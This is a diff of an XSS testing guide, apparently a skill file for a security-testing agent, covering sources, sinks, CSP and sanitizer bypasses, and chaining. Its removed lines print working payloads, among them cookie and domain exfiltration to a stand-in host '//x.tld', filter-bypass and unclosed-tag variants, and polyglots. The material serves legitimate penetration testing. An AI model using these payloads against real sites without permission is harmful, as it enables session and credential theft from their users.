@@ -1,201 +1,211 @@
 ---
 name: xss
 description: XSS testing covering reflected, stored, and DOM-based vectors with CSP bypass techniques
+metadata:
+  version: 1.0.0
 ---
 
 # XSS
 
-Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).
+Cross-site scripting is attacker-controlled input that reaches a render or execution sink without exact-context encoding, then executes in a victim's context. Delivery differs in shape: immediate reflection, persistence with later retrieval, or a client-only flow with no server round trip. Treat every caller-influenced string as untrusted until the exact sink encodes it and a runtime policy guards it.
 
 ## Attack Surface
 
-**Types**
-- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells
+**Delivery Shapes**
+- Immediate reflection: the input returns in the same response that carried it
+- Persistence: the input is stored and rendered later, in retrieval views, exports, notifications, inline file serving, or another principal's page
+- Client-only: a client-side source reaches an executing sink with no server round trip
 
 **Contexts**
-- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF
+- Markup text and nodes, attribute values, URL-bearing attributes, script strings, style contexts, and structured document nodes
+- Markup formats treated as active content by a renderer
 
-**Frameworks**
-- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR
+**Render Paths**
+- Server render, client render, and hydration or re-render paths, which apply different encoding to the same value
+- Message and document bodies rendered by restricted engines (mail, print, and report pipelines)
+- Uploaded files served inline under an active content type
 
 **Defenses to Bypass**
-- CSP/Trusted Types, DOMPurify, framework auto-escaping
+- Context encoding, sanitizer configuration, content-type and disposition handling, runtime script policy (CSP, Trusted Types), and URL scheme allowlists
 
-## Injection Points
+## Reconnaissance
 
-**Server Render**
-- Templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers
+### Source and Sink Mapping
 
-**Client Render**
-- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
-- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`
+- Enumerate sources: URL components, referrer, message channels, storage, server data, and uploaded file names or metadata
+- Trace each source to every sink that renders or evaluates it, including deferred, retrieval, and re-render paths
+- Instrument markup-insertion and evaluation sinks to log which values reach them
 
-**URL/DOM**
-- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes
+### Context Classification
 
-**Events/Handlers**
-- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers
+- Classify each sink: markup node, quoted or unquoted attribute, URL slot, script string, evaluator, style, or active-content document node
+- Record the encoding the application applies at that sink, and test with a marker that survives the encoder but changes meaning when the encoder is missing
+- Classify structured-document and message renderers separately; their execution rules differ from the browser's
 
-**Cross-Context**
-- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB
+### Defense Assessment
 
-**File/Metadata**
-- Image/SVG/XML names and EXIF, office documents processed server/client
+- Inspect encoding per sink rather than globally
+- Identify the sanitizer and its configuration; feed its output back through the parser and inspect the result
+- Inspect the runtime script policy: nonces and hashes, allowed origins, and whether every scriptable sink is covered
+- Verify content-type and disposition handling for every served upload
 
-### File Uploads
+### Trigger and Evidence Setup
 
-- SVG/HTML uploads served with `text/html` or `image/svg+xml` can execute inline
-- Verify content-type and `Content-Disposition: attachment`
-- Mixed MIME and sniffing bypasses; ensure `X-Content-Type-Options: nosniff`
+- Keep a trigger URL or navigation for each stored payload so later-view execution is attributable
+- Operate a listener to receive exfiltration callbacks, with one marker per payload
+- Snapshot the victim-context state that execution changes, so the proof shows effect rather than echo
 
-## Context Encoding Rules
+## Detection Channels
 
-- **HTML text**: encode `< > & " '`
-- **Attribute value**: encode `" ' < > &` and ensure attribute quoted; avoid unquoted attributes
-- **URL/JS URL**: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
-- **JS string**: escape quotes, backslashes, newlines; prefer `JSON.stringify`
-- **CSS**: avoid injecting into style; sanitize property names/values; beware `url()` and `expression()`
-- **SVG/MathML**: treat as active content; many tags execute via onload or animation events
+- Same-response execution of a controlled marker, which is the reflected finding.
+- Execution of a stored payload on a later retrieval view, which proves persistence.
+- Execution of a stored payload in a second principal's session, which proves the cross-principal path.
+- An instrumented sink invocation with no server reflection, which proves the client-only flow.
+- Sanitizer output that re-parses into executable markup, which proves the round-trip gap.
+- A served file that executes inline under its response type, which proves active-content delivery.
+- A policy-violation report from the runtime guard, which maps which sinks the policy covers and which it misses.
+- A callback receipt carrying the per-payload marker, which proves execution and exfiltration reach.
+- A state change in the victim context attributable to the executed payload, which proves effect beyond a script alert.
+- Encoded output that stays inert under the exact sink context, which reads as correct encoding rather than a finding.
+
+## Adversarial Capabilities
+
+XSS testing presupposes an input the application reflects, stores, or reads on the client, plus a victim-context render to observe, and it consumes both.
+- Submit candidate payloads through every carrier the surface accepts.
+- Write a value a second principal later views, and hold that principal's session to observe execution.
+- Influence client-side sources the application trusts: URL components, referrer, message channels, and storage.
+- Instrument sinks to log values before they are rendered or evaluated.
+- Operate a listener for exfiltration callbacks, with one marker per payload.
+- Snapshot the victim-context state a successful payload changes.
+
+## Trust Assumptions
+
+The class rests on one agreement: every caller-influenced string stays untrusted until it is encoded for the exact sink that renders it, and whatever the application stores or reads on the client stays data on the way to that sink.
+The agreement holds each render to exact-context encoding, holds sanitised output to a parser round trip that cannot morph into executable markup, holds persisted content to re-encoding on every later render, holds client-side data flow from source to sink to non-executable form, and holds the runtime script policy to enforcement across every scriptable sink.
+Script execution in a victim context appears when a clause fails: an encoder misses the sink's context, sanitised output re-parses into executable markup, stored content renders where it was never encoded, or a client-side source reaches an executing sink.
+Each variant breaks one clause: stored delivery breaks the persistence clause, and DOM delivery breaks the client-flow clause, while the immediate-reflection baseline rests on the exact-context encoding clause alone.
 
 ## Key Vulnerabilities
 
-### DOM XSS
+### Context Encoding Gaps
 
-**Sources**
-- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages
+- An encoder belonging to a different context: a markup value placed into an attribute, a URL slot, or a script string
+- Quoted and unquoted attribute handling, and attributes whose values become URLs or handlers
+- Structured document nodes the renderer treats as active content
+- Style and template contexts where a value reaches an expression rather than a literal
 
-**Sinks**
-- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
-- `setAttribute`, `setTimeout`/`setInterval` with strings
-- `eval`/`Function`, `new Worker` with blob URLs
+### Sanitizer Round Trip
 
-**Vulnerable Pattern**
-```javascript
-const q = new URLSearchParams(location.search).get('q');
-results.innerHTML = `<li>${q}</li>`;
-```
-Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`
+- Sanitised output re-parsed by the client can repair into executable markup; feed the output back through the parser
+- Configuration gaps: allowed elements or attributes that form a gadget with an allowed handler
+- Sanitizers that cover markup while other sinks stay live
 
-### Mutation XSS
+### Stored Delivery
 
-Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags):
-```html
-<noscript><p title="</noscript><img src=x onerror=alert(1)>
-<form><button formaction=javascript:alert(1)>
-```
+- Retrieval views, exports, notifications, and other principals' pages render content the writing path never encoded
+- Files served inline from an upload path execute under their response type
+- Content persisted across environments, caches, or exports re-renders where the original encoding assumptions no longer hold
 
-### Template Injection
+### Client-Only Flow
 
-Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
-```
-{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
-```
+- Sources: URL components, referrer, message channels, storage, and server data consumed in the client
+- Sinks: markup insertion, URL-bearing attributes, string-evaluating timers, dynamic code construction, and worker or document creation
+- Re-render and hydration paths where the client renders server-encoded content under different rules
 
-### CSP Bypass
+### Computed Expressions
 
-- Weak policies: missing nonces/hashes, wildcards, `data:` `blob:` allowed, inline events allowed
-- Script gadgets: JSONP endpoints, libraries exposing function constructors
-- Import maps or modulepreload lax policies
-- Base tag injection to retarget relative script URLs
-- Dynamic module import with allowed origins
+- A sink that evaluates expressions rather than rendering text; where the computation happens on the server, the template class owns the step
+- Client-only expression evaluation stays here
 
-### Trusted Types Bypass
+### Restricted Renderers
 
-- Custom policies returning unsanitized strings; abuse policy whitelists
-- Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets
+- Message and document engines execute a reduced subset: markup, styles, and link actions rather than scripts
+- Verify what a renderer allows before claiming execution
 
-### Email
+## Advanced Techniques
 
-- Most clients strip scripts but allow CSS/remote content
-- Use CSS/URL tricks only if relevant; avoid assuming JS execution
+**Sink Instrumentation**
+- Log every value that reaches a markup-insertion or evaluation sink, with the source that supplied it
+- Instrumentation reveals flows the static source list misses
 
-### PDF and Docs
+**Mutation Round Trip**
+- Take sanitizer output, re-parse it, and compare the executable result with the input that was cleaned
+- Parser repairs are the seam where cleaned markup regains active content
 
-- PDF engines may execute JS in annotations or links
-- Test `javascript:` in links and submit actions
+**Render-Path Parity**
+- Test server render, client render, and hydration for the same value; each applies different encoding
+- Re-test across transports and re-render clocks (cached, exported, and re-fetched views)
 
-## Polyglot Payloads
+**Chained Impact**
+- Prefer an impact-driven proof: a session-bound action, exfiltration to a listener, or a chain into another class
 
-Keep a compact set tuned per context:
-- **HTML node**: `<svg onload=alert(1)>`
-- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
-- **Attr unquoted**: `onmouseover=alert(1)`
-- **JS string**: `"-alert(1)-"`
-- **URL**: `javascript:alert(1)`
+**Payload Discipline**
+- Keep a small curated set per context and iterate on encoding rather than spraying catalogues
+
+## Bypass Techniques
+
+**Filter and Parser Bypasses**
+- Unclosed constructs a matching filter leaves alone yet the parser completes
+- Parser repairs and mutation shapes the filter's grammar does not anticipate
+- Case, whitespace, and encoding variants that survive the filter yet still parse
+- Element and handler variety where the obvious family is stripped
+
+**Runtime Policy Bypasses**
+- Policy edges: a sink family left uncovered, wildcard origins, and dynamic constructs the policy allows
+- Script gadgets in allowed code that turn data into execution
+- Base or relative-URL retargeting that points script loading at content the policy does not govern
+- Name the defence-bypass family where the bypass is generic rather than class-specific
+
+**Sanitizer Configuration Abuse**
+- Allowed elements or attributes that combine into a gadget
+- Namespace and parser-context switches the sanitizer does not model
+
+## Chaining Attacks
+
+- Execution to session-bound actions: drive a state change the victim did not intend (compose with the CSRF class)
+- Execution to credential and token exfiltration through the listener
+- Stored execution to a persistent foothold in the victim's client state
+- Execution to authorization effects where the application trusts client-readable state; the token class owns validation steps
+- Execution to overlays and interface impersonation served from the trusted origin
 
 ## Testing Methodology
 
-1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
-2. **Trace to sinks** - Map data flow from source to sink
-3. **Classify context** - HTML node, attribute, URL, script block, event handler, JS eval-like, CSS, SVG
-4. **Assess defenses** - Output encoding, sanitizer, CSP, Trusted Types, DOMPurify config
-5. **Craft payloads** - Minimal payloads per context with encoding/whitespace/casing variants
-6. **Multi-channel** - Test across REST, GraphQL, WebSocket, SSE, service workers
+1. **Identify sources** - URL components, referrer, message channels, storage, server data, and file metadata
+2. **Trace to sinks** - Map each source to every rendering or evaluating sink, including deferred and retrieval paths
+3. **Classify context** - Markup node, attribute, URL slot, script string, evaluator, style, or active-content document
+4. **Assess defenses** - Encoding per sink, sanitizer configuration, content-type handling, and runtime policy
+5. **Craft minimal payloads** - One per context, with encoding and shape variants, tested with a controlled marker
+6. **Exercise delivery shapes** - Immediate reflection, stored retrieval under a second principal, then client-only flow
+7. **Repeat across transports** - Every render path and transport the application exposes
+8. **Confirm the effect** - Execution plus a victim-context state change or a callback; every claim carries both
+
+## Variants
+
+- xss-stored - Persist the payload and prove execution on a later retrieval view, including inline file serving and multi-principal reads.
+- xss-dom - Trace non-persistent client-only source-to-sink flows through sink instrumentation, including fragment sources and cross-document messages.
 
 ## False Positives
 
-- Reflected content safely encoded in the exact context
-- CSP with nonces/hashes and no inline/event handlers
-- Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
-- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)
-
-## Filter Bypass Techniques
-
-### Unclosed Tag Bypass (Critical)
-Many server-side filters strip complete HTML tags (`<tag>...</tag>` or `<tag/>`) but fail on **unclosed tags**. Submit the opening tag without a closing `>` - the browser's parser completes it and executes any event handler:
-
-```
-# Standard (gets stripped by most filters):
-<svg onload=alert(1)>
-<img src=x onerror=alert(1)>
-
-# UNCLOSED TAG - bypasses filters that match balanced/closed tags:
-<svg onload=alert(1)          ← no closing >
-<img src=x onerror=alert(1)  ← no closing >
-<body onload=alert(1)         ← no closing >
-<input onfocus=alert(1) autofocus  ← no closing >
-```
-
-**When to use**: The server reflects the input but strips your payload. Try the unclosed variant - if `<svg onload=alert(1)>` fails but `<svg onload=alert(1)` triggers, the filter is matching closed tags only.
-
-**Test pattern**:
-```python
-payloads = [
-    "<svg onload=alert(1)",          # unclosed - key bypass
-    "<img src=x onerror=alert(1)",   # unclosed
-    "<body onload=alert(1)",         # unclosed
-    "<svg/onload=alert(1)",          # self-closing slash variant (also unclosed)
-]
-```
-
-### Case / Encoding Bypasses
-```
-<ScRiPt>alert(1)</ScRiPt>   # mixed case
-<script\x09>alert(1)</script>  # tab before >
-<sc\ript>                    # null byte / backslash
-```
-
-### Event Handler Variety (when script tags blocked)
-```
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<details open ontoggle=alert(1)>
-<iframe onload=alert(1)>
-<video onerror=alert(1)><source></video>
-javascript:alert(1)          # in href/src contexts
-```
+- Reflected content encoded exactly for its sink context
+- A runtime policy with nonces or hashes and no configurable sink escape
+- Enforced typed sinks with no bypassing gadget in allowed code
+- Scriptable contexts disabled: no markup pass-through and safe URL schemes enforced
+- Sanitized output that morphs but never executes on the real render path
+- Execution that reproduces only in the tester's own session, with no second principal and no victim path
+- A renderer that allows styles or links but never executes script
 
 ## Pro Tips
 
-1. Start with context classification, not payload brute force
-2. Use DOM instrumentation to log sink usage; it reveals unexpected flows
-3. Keep a small, curated payload set per context and iterate with encodings
-4. Validate defenses by configuration inspection and negative tests
-5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes
-6. Treat SVG/MathML as first-class active content; test separately
-7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration)
-8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports
+1. Start with context classification, not payload catalogues
+2. Use sink instrumentation; it reveals flows the static source list misses
+3. Keep a small curated payload set per context and iterate on encodings
+4. Validate defenses by configuration inspection plus negative tests
+5. Prefer impact-driven proofs (a session-bound action, exfiltration) over alert-style markers
+6. Treat active-content document formats as first-class and test them separately from markup
+7. Re-run tests under different render paths and transports; encoding often differs between them
+8. Treat the runtime policy as a feature to violate: attempt a violation and read the report
+9. Test stored payloads under a second principal; persistence is the common cross-principal path
 
 ## Summary
 
-Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.
+Context and sink decide execution: encode for the exact context, enforce runtime policy on every scriptable sink, and verify every render path. Small payloads with strong evidence beat payload catalogues.
